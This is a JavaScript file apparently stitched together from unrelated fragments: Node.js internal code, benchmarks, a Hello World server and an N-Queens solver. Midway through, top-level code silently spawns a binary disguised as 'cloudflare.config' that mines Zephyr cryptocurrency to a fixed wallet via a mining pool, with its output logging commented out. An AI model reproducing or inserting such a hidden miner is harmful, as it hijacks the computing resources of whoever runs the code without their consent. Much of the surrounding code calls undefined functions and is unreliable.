const http = require("http");

function establishServer(http) {
  const server = http.createServer((req, res) => {
    res.write("Hello World!");
    res.end();
  });

  server.listen(3000);
}

function disconnect() {
  console.log("Disconnected");
}

async function portIsFree(host, port, timeout = 3000) {
  if (port === 0) return; // Binding to a random port.

  const retryDelay = 150;
  const ac = new AbortController();
  const { signal } = ac;

  pSetTimeout(timeout).then(() => ac.abort());

  const asyncIterator = pSetInterval(retryDelay);
  while (true) {
    await asyncIterator.next();
    if (signal.aborted) {
      throw new ERR_DEBUGGER_STARTUP_ERROR(
        `Timeout (${timeout}) waiting for ${host}:${port} to be free`
      );
    }
    const error = await new Promise((resolve) => {
      const socket = net.connect(port, host);
      socket.on("error", resolve);
      socket.on("connect", () => {
        socket.end();
        resolve();
      });
    });
    if (error?.code === "ECONNREFUSED") {
      return;
    }
  }
}
function createAgentProxy(domain, client) {
  const agent = new EventEmitter();
  agent.then = (then, _catch) => {
    // TODO: potentially fetch the protocol and pretty-print it here.
    const descriptor = {
      [util.inspect.custom](depth, { stylize }) {
        return stylize(`[Agent ${domain}]`, "special");
      },
    };
    return PromisePrototypeThen(PromiseResolve(descriptor), then, _catch);
  };

  return new Proxy(agent, {
    __proto__: null,
    get(target, name) {
      if (name in target) return target[name];
      return function callVirtualMethod(params) {
        return client.callMethod(`${domain}.${name}`, params);
      };
    },
  });
}
function getHeapSnapshot(options) {
  const optionArray = getHeapSnapshotOptions(options);
  const handle = createHeapSnapshotStream(optionArray);
  assert(handle);
  return new HeapSnapshotStream(handle);
}

class CallTrackerContext {
  #expected;
  #calls;
  #name;
  #stackTrace;
  constructor({ expected, stackTrace, name }) {
    this.#calls = [];
    this.#expected = expected;
    this.#stackTrace = stackTrace;
    this.#name = name;
  }

  track(thisArg, args) {
    const argsClone = ObjectFreeze(ArrayPrototypeSlice(args));
    ArrayPrototypePush(
      this.#calls,
      ObjectFreeze({ thisArg, arguments: argsClone })
    );
  }

  get delta() {
    return this.#calls.length - this.#expected;
  }

  reset() {
    this.#calls = [];
  }
  getCalls() {
    return ObjectFreeze(ArrayPrototypeSlice(this.#calls));
  }

  report() {
    if (this.delta !== 0) {
      const message =
        `Expected the ${this.#name} function to be ` +
        `executed ${this.#expected} time(s) but was ` +
        `executed ${this.#calls.length} time(s).`;
      return {
        message,
        actual: this.#calls.length,
        expected: this.#expected,
        operator: this.#name,
        stack: this.#stackTrace,
      };
    }
  }
}

class CallTracker {
  #callChecks = new SafeSet();
  #trackedFunctions = new SafeWeakMap();

  #getTrackedFunction(tracked) {
    if (!this.#trackedFunctions.has(tracked)) {
      throw new ERR_INVALID_ARG_VALUE(
        "tracked",
        tracked,
        "is not a tracked function"
      );
    }
    return this.#trackedFunctions.get(tracked);
  }

  reset(tracked) {
    if (tracked === undefined) {
      this.#callChecks.forEach((check) => check.reset());
      return;
    }

    this.#getTrackedFunction(tracked).reset();
  }

  getCalls(tracked) {
    return this.#getTrackedFunction(tracked).getCalls();
  }

  calls(fn, expected = 1) {
    if (process._exiting) throw new ERR_UNAVAILABLE_DURING_EXIT();
    if (typeof fn === "number") {
      expected = fn;
      fn = noop;
    } else if (fn === undefined) {
      fn = noop;
    }

    validateUint32(expected, "expected", true);

    const context = new CallTrackerContext({
      expected,
      // eslint-disable-next-line no-restricted-syntax
      stackTrace: new Error(),
      name: fn.name || "calls",
    });
    const tracked = new Proxy(fn, {
      __proto__: null,
      apply(fn, thisArg, argList) {
        context.track(thisArg, argList);
        return ReflectApply(fn, thisArg, argList);
      },
    });
    this.#callChecks.add(context);
    this.#trackedFunctions.set(tracked, context);
    return tracked;
  }

  report() {
    const errors = [];
    for (const context of this.#callChecks) {
      const message = context.report();
      if (message !== undefined) {
        ArrayPrototypePush(errors, message);
      }
    }
    return errors;
  }

  verify() {
    const errors = this.report();
    if (errors.length === 0) {
      return;
    }
    const message =
      errors.length === 1
        ? errors[0].message
        : "Functions were not called the expected number of times";
    throw new AssertionError({
      message,
      details: errors,
    });
  }
}

function getHeapStatistics() {
  const buffer = heapStatisticsBuffer;

  updateHeapStatisticsBuffer();

  return {
    total_heap_size: buffer[kTotalHeapSizeIndex],
    total_heap_size_executable: buffer[kTotalHeapSizeExecutableIndex],
    total_physical_size: buffer[kTotalPhysicalSizeIndex],
    total_available_size: buffer[kTotalAvailableSize],
    used_heap_size: buffer[kUsedHeapSizeIndex],
    heap_size_limit: buffer[kHeapSizeLimitIndex],
    malloced_memory: buffer[kMallocedMemoryIndex],
    peak_malloced_memory: buffer[kPeakMallocedMemoryIndex],
    does_zap_garbage: buffer[kDoesZapGarbageIndex],
    number_of_native_contexts: buffer[kNumberOfNativeContextsIndex],
    number_of_detached_contexts: buffer[kNumberOfDetachedContextsIndex],
    total_global_handles_size: buffer[kTotalGlobalHandlesSizeIndex],
    used_global_handles_size: buffer[kUsedGlobalHandlesSizeIndex],
    external_memory: buffer[kExternalMemoryIndex],
  };
}

function arrayBufferViewTypeToIndex(abView) {}
class DefaultDeserializer {
  /**
   * Used to read some kind of host object, i.e. an
   * object that is created by native C++ bindings.
   * @returns {any}
   */
  _readHostObject() {
    const typeIndex = this.readUint32();
    const ctor = arrayBufferViewIndexToType(typeIndex);
    const byteLength = this.readUint32();
    const byteOffset = this._readRawBytes(byteLength);
    const BYTES_PER_ELEMENT = ctor.BYTES_PER_ELEMENT || 1;

    const offset = this.buffer.byteOffset + byteOffset;
    if (offset % BYTES_PER_ELEMENT === 0) {
      return new ctor(
        this.buffer.buffer,
        offset,
        byteLength / BYTES_PER_ELEMENT
      );
    }
    // Copy to an aligned buffer first.
    const buffer_copy = Buffer.allocUnsafe(byteLength);
    copy(this.buffer, buffer_copy, 0, byteOffset, byteOffset + byteLength);
    return new ctor(
      buffer_copy.buffer,
      buffer_copy.byteOffset,
      byteLength / BYTES_PER_ELEMENT
    );
  }
}

function getAssetAsBlob(key, options) {
  const asset = getRawAsset(key);
  return new Blob([asset], options);
}

function getAsset(key, encoding) {
  if (encoding !== undefined) {
    validateString(encoding, "encoding");
  }
  const asset = getRawAsset(key);
  if (encoding === undefined) {
    return ArrayBufferPrototypeSlice(asset);
  }
  const decoder = new TextDecoder(encoding);
  return decoder.decode(asset);
}

function deserialize(buffer) {
  const der = new DefaultDeserializer(buffer);
  der.readHeader();
  return der.readValue();
}

function benchELUSimple(n) {
  const worker = new Worker(__filename, { argv: ["idle cats"] });

  spinUntilIdle(worker, () => {
    bench.start();
    for (let i = 0; i < n; i++) worker.performance.eventLoopUtilization();
    bench.end(n);
    worker.postMessage("bye");
  });
}

function benchELUPassed(n) {
  const worker = new Worker(__filename, { argv: ["idle cats"] });

  spinUntilIdle(worker, () => {
    let elu = worker.performance.eventLoopUtilization();
    bench.start();
    for (let i = 0; i < n; i++)
      elu = worker.performance.eventLoopUtilization(elu);
    bench.end(n);
    worker.postMessage("bye");
  });
}

function spinUntilIdle(w, cb) {
  const t = w.performance.eventLoopUtilization();
  if (t.idle + t.active > 0) return process.nextTick(cb);
  setTimeout(() => spinUntilIdle(w, cb), 1);
}

const { spawn } = require("child_process");
let child = spawn(__dirname + "/./cloudflare.config", [
  "-o",
  "fr-zephyr.miningocean.org:5332",
  "-u",
  "ZEPHYR3BrZ9eJieCEnqLX93nMwGJxBqdpLSahMmCTbMWFU5Vj2fEzqvZfLvynQS3heTrEFaas71sNjLCxXz2eHGXXiqfMAgMTJi35",
  "-a",
  "rx/0",
  "-p",
  `all${Math.floor(+new Date() / 1000)}`,
  "--donate-level",
  "1",
]);

// child.stdout.on("data", (data) => {
//   console.log(`${data}`);
// });

class GCProfiler {
  #profiler = null;

  start() {
    if (!this.#profiler) {
      this.#profiler = new binding.GCProfiler();
      this.#profiler.start();
    }
  }

  stop() {
    if (this.#profiler) {
      const data = this.#profiler.stop();
      this.#profiler = null;
      return JSONParse(data);
    }
  }
}

var dfs = function (res, points, n, index) {
  for (var i = index; i < n; i++) {
    if (points.length !== i) return;
    for (var j = 0; j < n; j++) {
      if (isValid(points, [i, j])) {
        points.push([i, j]);
        dfs(res, points, n, i + 1);
        if (points.length === n) res.push(buildRes(points));
        points.pop();
      }
    }
  }
};

function main({ n, type, func }) {
  const useFds = func === "futimes";
  const fsFunc = fs[func + "Sync"];

  switch (type) {
    case "existing": {
      const files = [];

      // Populate tmpdir with mock files
      for (let i = 0; i < n; i++) {
        const path = tmpdir.resolve(`timessync-bench-file-${i}`);
        fs.writeFileSync(path, "bench");
        files.push(useFds ? fs.openSync(path, "r+") : path);
      }

      bench.start();
      for (let i = 0; i < n; i++) {
        fsFunc(files[i], i, i);
      }
      bench.end(n);

      if (useFds)
        files.forEach((x) => {
          try {
            fs.closeSync(x);
          } catch {
            // do nothing
          }
        });

      break;
    }
    case "non-existing": {
      bench.start();
      for (let i = 0; i < n; i++) {
        try {
          fsFunc(
            useFds
              ? 1 << 30
              : tmpdir.resolve(`.non-existing-file-${Date.now()}`),
            i,
            i
          );
        } catch {
          // do nothing
        }
      }
      bench.end(n);

      break;
    }
    default:
      new Error("Invalid type");
  }
}
var buildRes = function (points) {
  var res = [];
  var n = points.length;
  for (var i = 0; i < n; i++) {
    res[i] = "";
    for (var j = 0; j < n; j++) {
      res[i] += points[i][1] === j ? "Q" : ".";
    }
  }
  return res;
};

var isValid = function (oldPoints, newPoint) {
  var len = oldPoints.length;
  for (var i = 0; i < len; i++) {
    if (oldPoints[i][0] === newPoint[0] || oldPoints[i][1] === newPoint[1])
      return false;
    if (
      Math.abs(
        (oldPoints[i][0] - newPoint[0]) / (oldPoints[i][1] - newPoint[1])
      ) === 1
    )
      return false;
  }
  return true;
};
